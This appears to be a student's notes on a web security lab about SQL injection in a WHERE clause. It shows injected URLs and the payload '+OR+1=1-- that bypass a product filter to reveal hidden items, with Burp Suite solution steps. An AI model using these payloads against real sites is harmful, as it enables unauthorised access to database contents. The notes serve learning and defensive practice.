# Retrieving hidden data

``` https://insecure-website.com/products?category=Gifts'-- ```

-- double-dash sequence is a comment indicator in SQL, that means the rest of the query is interpreted as a comment

&ndash; this removes the remainder of query, so it no longer includes AND released = 1. All products are displayed 

``` https://insecure-website.com/products?category=Gifts'+OR+1=1-- ```

This results in the SQL query:

``` SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1```

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains and SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

``` SELECT * FROM products WHERE category = 'Gifts' AND released = 1 ```

**Solution**
1. Use Burp Suite to intercept and modife the request that sets the product category filter.
2. Modify the *category* parameter, giving it the value ``` '+OR+1=1-- ```
3. Submit the request, and verify that the response now contains additional items.

    ``` /filter?category=Food+%26+Drink'+OR+1=1-- ```

    The modified query will return all items where either the category is Food&Drink, or 1 is equal to 1. Since 1=1 is always true, the query will return all items.